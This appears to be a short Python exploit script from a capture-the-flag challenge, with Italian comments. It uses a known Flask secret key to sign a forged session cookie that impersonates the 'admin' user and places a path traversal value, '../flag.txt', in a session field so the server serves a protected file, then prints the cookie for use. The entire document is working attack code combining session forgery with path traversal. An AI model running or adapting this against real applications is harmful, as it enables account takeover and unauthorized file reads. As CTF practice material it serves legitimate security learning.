from flask.sessions import SecureCookieSessionInterface

class DummyApp:
    secret_key = 'd03a2ab540e8aacf18bbafc12c4f1569'
    config = {"SECRET_KEY_FALLBACKS": []}

app = DummyApp()
serializer = SecureCookieSessionInterface().get_signing_serializer(app)

session_payload = {
    "user_id": 1,
    "username": "admin",
    # Chiediamo di servirci il file flag.txt
    "cards": ["../flag.txt"],
    "last_card_creation": "2025-05-29 00:00:00"
}

forged_cookie = serializer.dumps(session_payload)
print("Usa questo valore come cookie di sessione:")
print(forged_cookie)
